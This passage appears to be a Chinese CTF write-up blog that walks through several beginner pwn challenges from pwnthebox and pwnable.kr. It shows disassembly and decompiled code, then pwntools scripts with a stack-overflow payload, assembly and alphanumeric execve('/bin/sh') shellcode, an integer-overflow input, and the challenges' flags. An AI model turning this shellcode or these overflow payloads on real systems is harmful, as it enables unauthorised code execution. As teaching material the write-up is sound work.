-0000000000000028 var_28          dq ?
-0000000000000020 var_20          dq ?
-0000000000000018 v5              dq ?
-0000000000000010 v6              dq ?
-0000000000000008 var_8           dq ?
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

`v5`的赋值直接就是`0x7FFFFFFFFFFFFFFF`，那么`v6 == 0.1`该怎么样用`16`进制数表示呢？可以在这个网站https://www.binaryconvert.com/result_double.html查看`0.1`用`IEEE754`双精度浮点数中的二进制格式。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/4.png)

当然也能在汇编源码中看到`ucomisd xmm0, cs:qword_C10`，双击`qword_C10`就能知道`0.1`在内存中的数值`0x3FB999999999999A`。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/5.png)

编写`Python`代码即可得到`PTB{4c092b9f-0176-442b-8afc-fd587f7c4a91}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10070)
payload = b'a'*0x18 + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A)
io.sendline(payload)
io.interactive()
```

------

### [shellcode](https://ce.pwnthebox.com/challenges?id=1765)

先`file ./mrctf2020_shellcode `查看文件类型，再`checksec --file=./mrctf2020_shellcode `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./mrctf2020_shellcode
./mrctf2020_shellcode: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d5024a9527dd620c442aaba45f15a2e9342d58ff, for GNU/Linux 3.2.0, not stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./mrctf2020_shellcode
[*] '/home/tyd/ctf/pwn/pwnthebox/mrctf2020_shellcode'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

使用`IDA pro 64bit`打开附件`mrctf2020_shellcode`，按`F5`反汇编源码失败，直接查看汇编代码。`buf`大小为`0x410`字节，而`read`函数读入到`buf`的限制大小为`0x400`字节，不存在栈溢出漏洞，但是足以系统调用`shell`啦。`jg`是如果`cmp`大于则跳转，`jl`是如果`cmp`小于则跳转，`jmp`是无条件跳转指令。

```assembly
.text:0000000000001155 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:0000000000001155                 public main
.text:0000000000001155 main            proc near               ; DATA XREF: _start+1D↑o
.text:0000000000001155
.text:0000000000001155 buf             = byte ptr -410h
.text:0000000000001155 var_4           = dword ptr -4
.text:0000000000001155
.text:0000000000001155 ; __unwind {
.text:0000000000001155                 push    rbp
.text:0000000000001156                 mov     rbp, rsp
.text:0000000000001159                 sub     rsp, 410h
.text:0000000000001160                 mov     rax, cs:stdin@@GLIBC_2_2_5
.text:0000000000001167                 mov     esi, 0          ; buf
.text:000000000000116C                 mov     rdi, rax        ; stream
.text:000000000000116F                 call    _setbuf
.text:0000000000001174                 mov     rax, cs:stdout@@GLIBC_2_2_5
.text:000000000000117B                 mov     esi, 0          ; buf
.text:0000000000001180                 mov     rdi, rax        ; stream
.text:0000000000001183                 call    _setbuf
.text:0000000000001188                 mov     rax, cs:stderr@@GLIBC_2_2_5
.text:000000000000118F                 mov     esi, 0          ; buf
.text:0000000000001194                 mov     rdi, rax        ; stream
.text:0000000000001197                 call    _setbuf
.text:000000000000119C                 lea     rdi, s          ; "Show me your magic!"
.text:00000000000011A3                 call    _puts
.text:00000000000011A8                 lea     rax, [rbp+buf]
.text:00000000000011AF                 mov     edx, 400h       ; nbytes
.text:00000000000011B4                 mov     rsi, rax        ; buf
.text:00000000000011B7                 mov     edi, 0          ; fd
.text:00000000000011BC                 mov     eax, 0
.text:00000000000011C1                 call    _read
.text:00000000000011C6                 mov     [rbp+var_4], eax
.text:00000000000011C9                 cmp     [rbp+var_4], 0
.text:00000000000011CD                 jg      short loc_11D6
.text:00000000000011CF                 mov     eax, 0
.text:00000000000011D4                 jmp     short locret_11E4
.text:00000000000011D6 ; ---------------------------------------------------------------------------
.text:00000000000011D6
.text:00000000000011D6 loc_11D6:                               ; CODE XREF: main+78↑j
.text:00000000000011D6                 lea     rax, [rbp+buf]
.text:00000000000011DD                 call    rax
.text:00000000000011DF                 mov     eax, 0
.text:00000000000011E4
.text:00000000000011E4 locret_11E4:                            ; CODE XREF: main+7F↑j
.text:00000000000011E4                 leave
.text:00000000000011E5                 retn
.text:00000000000011E5 ; } // starts at 1155
.text:00000000000011E5 main            endp
```

编写`Python`代码即可得到`PTB{983cfea6-e827-4ce1-8ae1-bd487168f519}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10116)
shellcode = asm('''
xor rax,rax
xor rdi,rdi
mov rdi ,0x68732f6e69622f
push rdi              
push rsp                 
pop rdi
xor rsi,rsi
xor rdx,rdx
push 0x3b   
pop rax
syscall
''')
# shellcode = asm(shellcraft.sh())
io.sendline(shellcode)
io.interactive()
```

------

### [number game](https://ce.pwnthebox.com/challenges?id=1774)

先`file ./wustctf2020_number_game  `查看文件类型，再`checksec --file=./wustctf2020_number_game  `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./wustctf2020_number_game                                                              
./wustctf2020_number_game: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ad95bd0bc056d1f68fc74a2a3f2cd7ce63ada796, not stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./wustctf2020_number_game                                                 
[*] '/home/tyd/ctf/pwn/pwnthebox/wustctf2020_number_game'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

使用`IDA pro 32bit`打开附件`wustctf2020_number_game`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  vulnerable();
  return 0;
}
```

双击`vulnerable()`查看函数详情：

```c
unsigned int vulnerable()
{
  int v1; // [esp+8h] [ebp-10h] BYREF
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  v1 = 0;
  __isoc99_scanf("%d", &v1);
  if ( v1 >= 0 || (v1 = -v1, v1 >= 0) )
    printf("You lose");
  else
    shell();
  return __readgsdword(0x14u) ^ v2;
}
```

当输入的数字`v1`是负数，且`v1`的相反数也是负数，才可以执行`shell`。`32`位系统`int`型取值范围是`[-2147483648, 2147483647]`。那这不是显然了吗？直接`nc`进去输入`-2147483647`就行啦。当然也可以编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10124`，发送`payload`即可得到`PTB{2cdb6e65-3494-4643-9d4a-3f08e76c1361}`，提交即可。

```python
from pwn import *

io = remote('redirect.do-not-trust.hacking.run', 10124)
io.sendline(b'-2147483648')
io.interactive()
```

------

### [Shell 黑客 2](https://ce.pwnthebox.com/challenges?id=1008)

题目没有附件，`nc redirect.do-not-trust.hacking.run 10168`可以输入但是没有回显。结合题目描述：

> 你知道什么是 shellcode 吗？也许这可以帮助你了解更多！

直接`asm(shellcraft.sh())`来执行`system("/bin/sh")`获取靶机`shell`权限。编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10021`，发送`payload`即可得到`PTB{9c4fe944-0fdc-497a-ad2a-05e609bc4a3d}`，提交即可。

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10168)
shellcode = b'PYVTX10X41PZ41H4A4I1TA71TADVTZ32PZNBFZDQC02DQD0D13DJE2O0Z2G7O1E7M04KO1P0S2L0Y3T3CKL0J0N000Q5A1W66MN0Y0X021U9J622A0H1Y0K3A7O5I3A114CKO0J1Y4Z5F06'
io.send(shellcode)
io.interactive()
```



## Pwnable.kr

### fd

这是**Pwnable.kr**的第一个挑战`fd`，来自**[Toddler's Bottle]**部分。题目描述中可以看到有个小孩在问他妈什么是Linux中的文件描述符，现在可以知道标题`fd`就是`file descriptor`的缩写。

```bash
Mommy! what is a file descriptor in Linux?

* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:
https://youtu.be/971eZhMHQQw

ssh fd@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

![](https://paper.tanyaodan.com/Pwnable/kr/fd/1.png)

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

![](https://paper.tanyaodan.com/Pwnable/kr/fd/2.png)

我们可以看到三个文件`fd`、`fd.c`和`flag`，其中`fd`是`ELF`二进制可执行文件，`fd.c`是编译二进制文件的`C`代码，用户`fd`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat fd.c`来查看`fd.c`的代码。

![](https://paper.tanyaodan.com/Pwnable/kr/fd/3.png)

我们通过代码审计可以看到变量`buf`被分配了`32`个字节作为缓冲区，该程序首先检查用户是否输入了两个参数(包括文件名)，如果没有就会得到一条`printf`输出语句提示需要给该可执行文件传递一个参数。

然后我们发现有个`int`型变量`fd`被赋值为`atoi(argv[1])-0x1234`，即用户输入的数字被`atoi()`函数转换成`int`型后与`0x1234`的差值。此外还有一个`int`型变量`len`的值是`read(fd, buf, 32)`的函数返回值。在`Linux`机器和`C`语言中，`Linux`文件描述符的值为`0`表示标准输入`stdin`，`1`表示标准输出`stdout`，`2`表示标准错误`stderr`。当`fd`的值为`0`的时候，程序将从`stdin`中读入`32`个字节数据到`buf`变量中，因此我们输入的参数应该是`0x1234`的十进制值`4660`。

接着有一个字符串比较函数`strcmp()`，如果`buf`变量的值等于字符串`LETMEWIN`的话，`strcmp()`函数返回值就为0，此时`if`条件就为真，程序会系统调用输出`flag`：`mommy! I think I know what a file descriptor is!!`。

![](https://paper.tanyaodan.com/Pwnable/kr/fd/4.png)

有了以上思路后，我们也可以编写`Python`代码来获取`flag`：`mommy! I think I know what a file descriptor is!!`。

```python
from pwn import *

shell = ssh(user='fd', host='pwnable.kr', port=2222, password='guest')
io = shell.process(executable='./fd', argv=['fd', '4660'])
io.sendline(b'LETMEWIN')
io.interactive() 
```

![](https://paper.tanyaodan.com/Pwnable/kr/fd/5.png)

------

